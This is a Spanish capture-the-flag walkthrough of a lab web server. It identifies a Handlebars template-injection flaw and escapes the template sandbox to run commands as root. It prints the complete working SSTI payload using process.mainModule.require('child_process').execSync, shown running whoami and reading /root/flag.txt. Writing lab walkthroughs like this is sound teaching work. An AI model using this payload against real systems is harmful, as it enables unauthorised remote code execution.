1. Reconocimiento / Enumeración

Empezamos con un escaneo de puertos usando nmap con scripts por defecto (-sC) y detección de versiones (-sV).

bash 
sudo nmap -sC -sV {target_IP}

El escaneo revela 2 puertos abiertos:

22 OpenSSH 8.2p1 (SSH) Externo
80 Node.js (Express — HTTP) Externo
🌐

2. Exploración de la Aplicación Web

Al acceder a http://{target_IP} encontramos una página con un formulario de suscripción por email. Usando Wappalyzer confirmamos el stack tecnológico:

Node.js — Runtime
Express — Framework
Handlebars — Template Engine
📘

Handlebars es un motor de plantillas para Node.js. Genera HTML dinámicamente insertando datos en plantillas. Si la entrada del usuario se inserta directamente en la plantilla sin sanitizar, es vulnerable a SSTI (Server-Side Template Injection).

💉

3. Detección de SSTI

Para verificar si el formulario es vulnerable a Server-Side Template Injection, inyectamos una expresión de plantilla en el campo de email:

payload — campo email 
{{7*7}}

Si la respuesta devuelve 49, el servidor está evaluando nuestra entrada como código de plantilla. Si devuelve un error mencionando Handlebars y la ruta /root/Backend, también confirma la vulnerabilidad y nos revela información interna.

⚠️

El mensaje de error expone que Handlebars está en /root/Backend — esto indica que el servidor corre como root. Cualquier comando que ejecutemos tendrá privilegios máximos.

El flujo de un ataque SSTI es el siguiente:

🐧 Atacante
→
🔧 Burp Suite
→
🖥️ Express
→
📝 Handlebars
→
💀 RCE como root
💡

¿Qué es SSTI? — Server-Side Template Injection ocurre cuando la entrada del usuario se inserta directamente en una plantilla del servidor sin sanitizar. El motor evalúa la entrada como código, permitiendo al atacante ejecutar expresiones arbitrarias y, en muchos casos, comandos del sistema.

🔧

4. Explotación con Burp Suite

Para manipular la petición POST del formulario, necesitamos Burp Suite como proxy de interceptación.

Paso 1 — Configurar el proxy del navegador (con FoxyProxy o manualmente) para que pase por Burp.

Paso 2 — Enviar el formulario de email e interceptar la petición POST en Burp.

Paso 3 — Enviar la petición al Repeater con Ctrl+R.

Desde HackTricks — SSTI, encontramos un payload para Handlebars (NodeJS) que usa require para ejecutar comandos:

payload inicial — hacktricks 
// Línea clave dentro del payload de Handlebars
return require('child_process').exec('whoami');

Al enviarlo URL-encodeado en el parámetro email=, obtenemos un error:

respuesta del servidor 
ReferenceError: require is not defined
🚫

El entorno está en sandbox — require() no está disponible directamente. Handlebars restringe el acceso a funciones del sistema. Necesitamos encontrar una forma de escapar del sandbox.

🔓

5. Bypass del Sandbox

La clave para escapar del sandbox de Handlebars es acceder a require a través del objeto global process de Node.js. Aunque require no está definido directamente, podemos llegar a él mediante:

bypass 
process.mainModule.require('child_process').execSync('<COMANDO>')
📘

process es la variable del scope top-level (global) en Node.js. Proporciona información y control sobre el proceso actual. A través de process.mainModule.require podemos cargar módulos del sistema, eludiendo las restricciones del sandbox de Handlebars.

El payload completo de Handlebars SSTI queda así:

handlebars — payload completo 
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

Proceso de envío:

1. Copiar el payload y llevarlo a la pestaña Decoder de Burp Suite.

2. Seleccionar Encode as → URL para codificarlo correctamente.

3. En el Repeater, reemplazar el valor de email= con el payload URL-encodeado.

4. Hacer clic en Send.

respuesta del servidor 
// Resultado del whoami en la respuesta HTTP
root
✅

RCE confirmado como root. Tenemos ejecución remota de comandos con el máximo nivel de privilegios. Ahora solo queda leer la flag.

🏁

6. Captura de la Flag

Sustituimos whoami por el comando para leer la flag en el payload:

comando — dentro del payload 
// Reemplazar la línea del execSync:
return process.mainModule.require('child_process').execSync('cat /root/flag.txt');

Repetimos el proceso: URL-encode → pegar en email= → Send. La flag aparece en la respuesta.

8. Lecciones Aprendidas

1

SSTI (Server-Side Template Injection) — Siempre probar expresiones como {{7*7}} en campos de entrada de aplicaciones web. Si el servidor evalúa la expresión, es vulnerable.

2

Identificar el Template Engine — Los mensajes de error a menudo revelan el motor de plantillas (Handlebars, Jinja2, Twig...). Cada uno tiene payloads específicos. HackTricks es un recurso excelente.

3

URL Encoding — Al enviar payloads por HTTP, los caracteres especiales deben codificarse en URL. Burp Suite tiene un encoder integrado en la pestaña Decoder.

4

Sandbox Escape en Node.js — Cuando require no está disponible, el objeto global process.mainModule permite acceder a módulos del sistema y escapar del sandbox.

5

Principio de mínimo privilegio — El servidor corriendo como root amplifica cualquier vulnerabilidad. Un servicio web nunca debería ejecutarse con privilegios de administrador.
